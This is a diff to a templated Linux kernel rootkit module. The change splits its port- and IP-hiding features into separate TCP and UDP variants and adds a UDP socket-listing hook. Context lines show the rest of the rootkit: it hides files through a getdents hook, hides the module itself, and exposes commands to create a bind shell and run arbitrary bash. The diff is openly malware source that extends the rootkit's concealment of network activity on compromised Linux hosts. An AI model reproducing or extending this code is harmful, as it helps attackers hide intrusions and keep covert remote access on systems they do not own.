@@ -23,8 +23,9 @@ MODULE_VERSION("0.01");
 #include "mods/hidedent.h"
 {% endif %}
 
-{% if hide_port or hide_ip or connector %}
+{% if hide_tcp_port or hide_tcp_ip or hide_udp_port or hide_udp_ip or connector %}
 #include "hooker/tcp_seq_show.h"
+#include "hooker/udp_seq_show.h"
 #include "mods/hideport.h"
 #include "mods/hideip.h"
 {% endif %}
@@ -37,13 +38,16 @@ MODULE_VERSION("0.01");
 #include "mods/runshell.h"
 {% endif %}
 
-void init_rootkit(void) {
-
+void init_rootkit(void)
+{
     {% if hide_dent or connector %}
     install_getdents_hook();
     {% endif %}
-    {% if hide_port or hide_ip or connector %}
+    {% if hide_tcp_port or hide_tcp_ip or connector %}
     install_tcp_seq_show_hook();
+    {% endif %}
+    {% if hide_udp_port or hide_udp_ip or connector %}
+    install_udp_seq_show_hook();
     {% endif %}
     {% if hideme %}
     hideme("");
@@ -53,10 +57,14 @@ void init_rootkit(void) {
     add_function("SHOWME", showme);
     add_function("HIDE_DENT", hide_dent);
     add_function("SHOW_HIDDEN_DENT", show_hidden_dent);
-    add_function("HIDE_PORT", hide_port);
-    add_function("SHOW_HIDDEN_PORT", show_hidden_port);
-    add_function("HIDE_IP", hide_ip);
-    add_function("SHOW_HIDDEN_IP", show_hidden_ip);
+    add_function("HIDE_TCP_PORT", hide_tcp_port);
+    add_function("SHOW_HIDDEN_TCP_PORT", show_hidden_tcp_port);
+    add_function("HIDE_TCP_IP", hide_tcp_ip);
+    add_function("SHOW_HIDDEN_TCP_IP", show_hidden_tcp_ip);
+    add_function("HIDE_UDP_PORT", hide_udp_port);
+    add_function("SHOW_HIDDEN_UDP_PORT", show_hidden_udp_port);
+    add_function("HIDE_UDP_IP", hide_udp_ip);
+    add_function("SHOW_HIDDEN_UDP_IP", show_hidden_udp_ip);
     add_function("BINDSHELL_CREATE", bindshell_create);
     add_function("RUN_CUSTOM_BASH", run_custom_bash);
     {% endif %}
@@ -65,24 +73,33 @@ void init_rootkit(void) {
     {% for dent in hide_dent %}
     hide_dent("{{dent}}");
     {% endfor %}
-    {% for port in hide_port %}
-    hide_port("{{port}}");
+    {% for port in hide_tcp_port %}
+    hide_tcp_port("{{port}}");
     {% endfor %}
-    {% for ip in hide_ip %}
-    hide_ip("{{ip}}");
+    {% for ip in hide_tcp_ip %}
+    hide_tcp_ip("{{ip}}");
+    {% endfor %}
+    {% for port in hide_udp_port %}
+    hide_udp_port("{{port}}");
+    {% endfor %}
+    {% for ip in hide_udp_ip %}
+    hide_udp_ip("{{ip}}");
     {% endfor %}
     {% for shell in shells %}
     run_custom_bash("{{shell}}");
     {% endfor %}
-
 }
 
-void clear_rootkit(void) {
+void clear_rootkit(void)
+{
     {% if hide_dent or connector %}
     remove_getdents_hook();
     {% endif %}
-    {% if hide_port or hide_ip or connector %}
+    {% if hide_tcp_port or hide_tcp_ip or connector %}
     remove_tcp_seq_show_hook();
+    {% endif %}
+    {% if hide_udp_port or hide_udp_ip or connector %}
+    remove_udp_seq_show_hook();
     {% endif %}
     {% if connector %}
     clear_functions();
@@ -93,7 +110,8 @@ void clear_rootkit(void) {
 DECLARE_WAIT_QUEUE_HEAD(runner_wait_queue);
 
 struct task_struct *runner_task = NULL;
-int runner(void *ptr) {
+int runner(void *ptr)
+{
     DECLARE_WAITQUEUE(wq, current);
     add_wait_queue(&runner_wait_queue, &wq);
     while (!kthread_should_stop()) {
@@ -106,7 +124,8 @@ int runner(void *ptr) {
 }
 {% endif %}
 
-static int __init rootkit_example_init(void) {
+static int __init rootkit_example_init(void)
+{
     init_rootkit();
 
     {% if connector %}
@@ -120,7 +139,8 @@ static int __init rootkit_example_init(void) {
     return 0;
 }
 
-static void __exit rootkit_example_exit(void) {
+static void __exit rootkit_example_exit(void)
+{
     {% if connector %}
     kthread_stop(runner_task);
     {% endif %}
